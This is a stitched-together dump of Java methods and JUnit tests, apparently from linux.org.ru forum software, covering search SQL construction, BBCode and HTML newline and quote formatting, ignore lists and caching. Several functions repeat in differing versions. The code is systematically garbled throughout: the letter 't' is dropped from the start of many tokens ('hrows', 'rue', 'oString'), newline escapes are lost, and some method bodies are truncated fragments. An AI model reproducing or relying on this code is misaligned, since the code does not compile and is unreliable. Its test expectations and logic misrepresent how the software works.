public String show ( Connection db ) hrows SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, title, postdate, topic, userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public void estUnexceptedCut ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( rue ) ; String result = proc . preparePostText ( null , " [list][*][cut][/cut][/list] " ) ; assertEquals ( " <p><ul><li></ul><p> " , result ) ; } 
public void estBBinListType ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " [b][list= \" [/b] \" ][/list] " ) ; assertEquals ( " <p>[b]<ol type= \" &#91;/b&#93; \" ></ol><p> " , result ) ; } 
public ModelAndView showUserTopics ( @RequestParam ( " nick " ) String nick , @RequestParam ( value = " offset " , required = false ) Integer offset , @RequestParam ( value = " output " , required = false ) String output , HttpServletResponse response ) hrows Exception { Connection db = null ; Map < String , Object > params = new HashMap < String , Object > ( ) ; ry { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public void write ( OutputStream df ) hrows IOException { profileHashtable . setObject ( SYSTEM_TIMESTAMP , new Date ( ) . getTime ( ) ) ; ObjectOutputStream dof = null ; ry { dof = new ObjectOutputStream ( df ) ; 
public String process ( ) { StringTokenizer st = new StringTokenizer ( htmlSpecialChars ( ext ) , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . oString ( ) ; if ( NewLine ) { res = nl2br ( res , quoting ) ; } if ( exNewLine ) { res = exnl2br ( res , quoting ) ; } return res ; } 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ : "&#58;", "&#91;", "&#93;", "&lt;", "&gt;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public String process ( ) { String str ; if ( outputLorcode ) { str = CodeTag . escapeHtmlBBcode ( ext ) ; } else { str = htmlSpecialChars ( ext ) ; } StringTokenizer st = new StringTokenizer ( str , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . oString ( ) ; if ( newLine ) { res = nl2br ( res , quoting ) ; } if ( exNewLine ) { res = exnl2br ( res , quoting , outputLorcode ) ; } return res ; } 
public void enableNewLineMode ( ) { newLine = rue ; exNewLine = false ; } 
public void enableTexNewLineMode ( ) { newLine = false ; exNewLine = rue ; } 
static String exnl2br ( String ext , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return ext ; } return ext . replaceAll ( exnlRE . pattern ( ) , " <p> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } if ( i ! = 0 & & ! outputLorcode ) { buf . append ( " <p> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; if ( outputLorcode ) { buf . append ( " [i]> " ) ; i + = 4 ; } else { buf . append ( " <i> " ) ; } } } else { cr = rue ; } } else { cr = false ; } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } return buf . oString ( ) ; } 
public void estParaSubstition ( ) { String str = " his is a line r rwith some nlinebreaks in it " ; String s = HTMLFormatter . exnl2br ( str , false , false ) ; Integer i = s . indexOf ( " <p> " ) ; assertThat ( " Newlines is changed to <p> " , i , CoreMatchers . not ( - 1 ) ) ; Integer b = s . indexOf ( " <p> " , i + 3 ) ; assertThat ( " Wait, there should be two paras " , b , CoreMatchers . not ( - 1 ) ) ; } 
public void estBBCode1 ( ) { HTMLFormatter f = new HTMLFormatter ( " est ntest ntest " ) ; f . setOutputLorcode ( rue ) ; f . enableQuoting ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " est ntest ntest " , f . process ( ) ) ; } 
public void estBBCode2 ( ) { HTMLFormatter f = new HTMLFormatter ( " www.linux.org.ru " ) ; f . setOutputLorcode ( rue ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; assertEquals ( " [url=http:www.linux.org.ru]www.linux.org.ru[/url] " , f . process ( ) ) ; } 
public void estBBCode3 ( ) { HTMLFormatter f = new HTMLFormatter ( " http:www.linux.org.ru/ " ) ; f . setOutputLorcode ( rue ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; assertEquals ( " [url=http:www.linux.org.ru/]http:www.linux.org.ru/[/url] " , f . process ( ) ) ; } 
public void estBBCode4 ( ) { HTMLFormatter f = new HTMLFormatter ( " >test ntest " ) ; f . setOutputLorcode ( rue ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " [i]>test n[/i] ntest " , f . process ( ) ) ; } 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " ex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; form . setOutputLorcode ( rue ) ; } return form . process ( ) ; } 
public static String replaceAll ( CharSequence str , char [ ] chars , String [ ] replacement ) { StringBuilder buffer = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { char c = str . charAt ( i ) ; boolean matched = false ; for ( int j = 0 ; j < chars . length ; j + + ) { if ( c = = chars [ j ] ) { buffer . append ( replacement [ j ] ) ; matched = rue ; } } if ( ! matched ) { buffer . append ( c ) ; } } return buffer . oString ( ) ; } 
public String process ( ) { String str ; if ( outputLorcode ) { str = escapeHtmlBBcode ( ext ) ; } else { str = htmlSpecialChars ( ext ) ; } StringTokenizer st = new StringTokenizer ( str , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . oString ( ) ; if ( newLine ) { res = nl2br ( res , quoting ) ; } if ( exNewLine ) { res = exnl2br ( res , quoting , outputLorcode ) ; } return res ; } 
static String exnl2br ( String ext , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return ext ; } return ext . replaceAll ( exnlRE . pattern ( ) , " <p> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } if ( i ! = 0 & & ! outputLorcode ) { buf . append ( " <p> " ) ; } if ( outputLorcode ) { if ( ext . substring ( i ) . rim ( ) . startsWith ( " > " ) ) { quot = rue ; buf . append ( " [i] " ) ; } } else { if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } } } else { cr = rue ; } } else { cr = false ; } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } return buf . oString ( ) ; } 
public static String escapeHtmlBBcode ( String content ) { ".toCharArray(), new String[]{ "&#91;", "&#93;", "&#40;", "&#41;", "&#123;", "&#125;", "&nbsp; &nbsp;"}); return content; } 
public void estBBCode5 ( ) { HTMLFormatter f = new HTMLFormatter ( " <> " ) ; f . setOutputLorcode ( rue ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " <> " , f . process ( ) ) ; } 
public void estBBCode6 ( ) { HTMLFormatter f = new HTMLFormatter ( " est http:www.linux.org.ru/jump-message.jsp?msgid=4238459&cid=4240245 test " ) ; f . setOutputLorcode ( rue ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " est [url=http:www.linux.org.ru/jump-message.jsp?msgid=4238459&cid=4240245]http:www.linux.org.ru/jump-message.jsp?msgid=4238459&cid=4240245[/url] test " , f . process ( ) ) ; } 
static String exnl2br ( String ext , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return ext ; } return ext . replaceAll ( exnlRE . pattern ( ) , " <p> " ) ; } StringBuilder buf = new StringBuilder ( ) ; boolean cr = false ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( cr | | i = = 0 ) { if ( quot ) { quot = false ; if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } if ( i ! = 0 & & ! outputLorcode ) { buf . append ( " <p> " ) ; } if ( outputLorcode ) { if ( ext . substring ( i ) . rim ( ) . startsWith ( " > " ) ) { quot = rue ; buf . append ( " n[i] " ) ; } } else { if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } } } else { cr = rue ; } } else { cr = false ; } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } return buf . oString ( ) ; } 
public void estBBCode4 ( ) { HTMLFormatter f = new HTMLFormatter ( " >test ntest " ) ; f . setOutputLorcode ( rue ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " n[i]>test n[/i] ntest " , f . process ( ) ) ; } 
public void estBBCode7 ( ) { HTMLFormatter f = new HTMLFormatter ( " est n>test " ) ; f . setOutputLorcode ( rue ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " est n[i] n>test[/i] " , f . process ( ) ) ; } 
public void estBBCode8 ( ) { HTMLFormatter f = new HTMLFormatter ( " est & " ) ; f . setOutputLorcode ( rue ) ; f . enableQuoting ( ) ; f . enableUrlHighLightMode ( ) ; f . enableTexNewLineMode ( ) ; assertEquals ( " est & " , f . process ( ) ) ; } 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " ex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . setOutputLorcode ( rue ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; form . setOutputLorcode ( rue ) ; } return form . process ( ) ; } 
public void estBr ( ) hrows SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; proc . setIncludeCut ( false ) ; String result = proc . preparePostText ( null , " est[br]test " ) ; assertEquals ( " <p>test<br>test " , result ) ; } 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . setOutputLorcode ( rue ) ; } if ( " ex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . setOutputLorcode ( rue ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; form . setOutputLorcode ( rue ) ; } return form . process ( ) ; } 
public String process ( ) { String str ; if ( outputLorcode ) { str = escapeHtmlBBcode ( ext ) ; } else { str = htmlSpecialChars ( ext ) ; } StringTokenizer st = new StringTokenizer ( str , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { sb . append ( formatHTMLLine ( st . nextToken ( ) ) ) ; } String res = sb . oString ( ) ; if ( newLine ) { res = nl2br ( res , quoting , outputLorcode ) ; } if ( exNewLine ) { res = exnl2br ( res , quoting , outputLorcode ) ; } return res ; } 
public static String nl2br ( String ext ) { return nl2br ( ext , false , false ) ; } 
static String nl2br ( String ext , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return ext . replaceAll ( nlRE . pattern ( ) , " [br] " ) ; } else { return ext . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } } StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; buf . append ( " </i> " ) ; } if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } if ( ext . charAt ( i ) = = '' ) { buf . append ( " <br> " ) ; } } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
public void estBBCode9 ( ) { HTMLFormatter f = new HTMLFormatter ( " est r ntest " ) ; f . setOutputLorcode ( rue ) ; f . enableUrlHighLightMode ( ) ; f . enableNewLineMode ( ) ; assertEquals ( " est[br] ntest " , f . process ( ) ) ; } 
public void addSection ( int section ) { sections . add ( section ) ; } 
public String show ( Connection db ) hrows SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, title, postdate, topic, userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; select . append ( " AND msgbase_postdate>'now'::timestamp-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; select . append ( " AND msgbase_postdate>'now'::timestamp-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public String show ( Connection db ) hrows SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 ) { select . append ( " , topics, groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public String show ( Connection db ) hrows SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 ) { select . append ( " , topics, groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public String show ( Connection db ) hrows SQLException , UserErrorException { StringBuilder select = new StringBuilder ( " " + " SELECT " + " msgs.id, msgs.title, msgs.postdate, topic, msgs.userid, rank(idxFTI, q) as rank, message, bbcode " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } if ( section ! = 0 ) { select . append ( " , topics, groups " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND msgs.postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; select . append ( " AND topics.id = topic AND groups.id = topics.groupid " ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND msgs.userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
public static int parseInclude ( String include ) { if ( include = = null ) { return SEARCH_ALL ; } if ( " opics " . equals ( include ) ) { return SEARCH_TOPICS ; } return SEARCH_ALL ; } 
public static int parseDate ( String date ) { if ( date = = null ) { return SEARCH_YEAR ; } if ( " 3month " . equals ( date ) ) { return SEARCH_3MONTH ; } if ( " all " . equals ( date ) ) { return SEARCH_ALL ; } return SEARCH_YEAR ; } 
public static String getViewer ( SearchViewer viewer , boolean nocache ) hrows SQLException , UserErrorException { return new ViewerCacher ( ) . get ( viewer , nocache ) ; } 
public String get ( SearchViewer viewer , boolean nocache ) hrows SQLException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( ) ) ; String res = null ; if ( ! nocache ) { ime = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = rue ; } if ( res = = null ) { Connection db = null ; ry { long current = new Date ( ) . getTime ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
private String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form . enableUrlHighLightMode ( ) ; form . setOutputLorcode ( rue ) ; if ( " ntobrq " . equals ( mode ) ) { form . enableNewLineMode ( ) ; form . enableQuoting ( ) ; } if ( " ntobr " . equals ( mode ) ) { form . enableNewLineMode ( ) ; } if ( " ex " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; } if ( " quot " . equals ( mode ) ) { form . enableTexNewLineMode ( ) ; form . enableQuoting ( ) ; } return form . process ( ) ; } 
static String nl2br ( String ext , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return ext . replaceAll ( nlRE . pattern ( ) , " [br] " ) ; } else { return ext . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } } StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } if ( outputLorcode ) { if ( ext . substring ( i ) . rim ( ) . startsWith ( " > " ) ) { quot = rue ; buf . append ( " [i] " ) ; } } else { if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } } if ( ext . charAt ( i ) = = '' ) { if ( outputLorcode ) { buf . append ( " [br] " ) ; } else { buf . append ( " <br> " ) ; } } } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { buf . append ( " </i> " ) ; } return buf . oString ( ) ; } 
public void estBBCode10 ( ) { HTMLFormatter f = new HTMLFormatter ( " est ntest " ) ; f . setOutputLorcode ( rue ) ; f . enableNewLineMode ( ) ; f . enableUrlHighLightMode ( ) ; f . enableQuoting ( ) ; assertEquals ( " est[br] ntest " , f . process ( ) ) ; } 
public void estBBCode11 ( ) { HTMLFormatter f = new HTMLFormatter ( " >test ntest " ) ; f . setOutputLorcode ( rue ) ; f . enableNewLineMode ( ) ; f . enableUrlHighLightMode ( ) ; f . enableQuoting ( ) ; assertEquals ( " [i]>test[/i][br] ntest " , f . process ( ) ) ; } 
private static int allocateMsgid ( Connection db ) hrows SQLException { Statement st = null ; ResultSet rs = null ; ry { st = db . createStatement ( ) ; 
public ModelAndView search ( @RequestParam ( value = " q " , required = false ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q = = null ; params . put ( " initial " , initial ) ; if ( q = = null ) { q = " " ; } params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; ViewerCacher cacher = new ViewerCacher ( ) ; params . put ( " result " , cacher . get ( sv , false ) ) ; params . put ( " cached " , cacher . isFromCache ( ) ) ; params . put ( " ime " , cacher . getTime ( ) ) ; } return new ModelAndView ( " search " , params ) ; } 
public static int parseInclude ( String include ) { if ( include = = null ) { return SearchViewer . SEARCH_ALL ; } if ( " opics " . equals ( include ) ) { return SearchViewer . SEARCH_TOPICS ; } return SearchViewer . SEARCH_ALL ; } 
public static int parseDate ( String date ) { if ( date = = null ) { return SearchViewer . SEARCH_YEAR ; } if ( " 3month " . equals ( date ) ) { return SearchViewer . SEARCH_3MONTH ; } if ( " all " . equals ( date ) ) { return SearchViewer . SEARCH_ALL ; } return SearchViewer . SEARCH_YEAR ; } 
public static Set < Integer > makeHideSet ( Connection db , CommentList comments , int filterChain , Map < Integer , String > ignoreList ) hrows SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return null ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public static Map < Integer , String > getIgnoreList ( Connection db , String nick ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT a.ignored,b.nick FROM ignore_list a, users b WHERE a.userid=(SELECT id FROM users WHERE nick=?) AND b.id=a.ignored " ) ; pst . clearParameters ( ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; Map < Integer , String > cignored = new HashMap < Integer , String > ( ) ; while ( rs . next ( ) ) { cignored . put ( rs . getInt ( " ignored " ) , rs . getString ( " nick " ) ) ; } return cignored ; } 
static String nl2br ( String ext , boolean quoting , boolean outputLorcode ) { if ( ! quoting ) { if ( outputLorcode ) { return ext . replaceAll ( nlRE . pattern ( ) , " [br] " ) ; } else { return ext . replaceAll ( nlRE . pattern ( ) , " <br> " ) ; } } StringBuilder buf = new StringBuilder ( ) ; boolean quot = false ; for ( int i = 0 ; i < ext . length ( ) ; i + + ) { if ( ext . charAt ( i ) = = '\r' ) { continue ; } if ( ext . charAt ( i ) = = '' | | i = = 0 ) { if ( quot ) { quot = false ; if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } if ( outputLorcode ) { if ( ext . substring ( i ) . rim ( ) . startsWith ( " > " ) ) { quot = rue ; buf . append ( " [i] " ) ; } } else { if ( ext . substring ( i ) . rim ( ) . startsWith ( " &gt; " ) ) { quot = rue ; buf . append ( " <i> " ) ; } } if ( ext . charAt ( i ) = = '' ) { if ( outputLorcode ) { buf . append ( " [br] " ) ; } else { buf . append ( " <br> " ) ; } } } buf . append ( ext . charAt ( i ) ) ; } if ( quot ) { if ( outputLorcode ) { buf . append ( " [/i] " ) ; } else { buf . append ( " </i> " ) ; } } return buf . oString ( ) ; } 
public void estBBCode12 ( ) { HTMLFormatter f = new HTMLFormatter ( " >test n>test " ) ; f . setOutputLorcode ( rue ) ; f . enableNewLineMode ( ) ; f . enableUrlHighLightMode ( ) ; f . enableQuoting ( ) ; assertEquals ( " [i]>test[/i][i][br] " + " >test[/i] " , f . process ( ) ) ; 
public void estCodeExcape ( ) hrows BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , " [code] \" code&code \" [/code] " ) ; assertEquals ( " <p><div class=code><pre class= \" brush: plain; wrap-lines: false \" >&quot;code&amp;code&quot;</pre></div><p> " , result ) ; } 
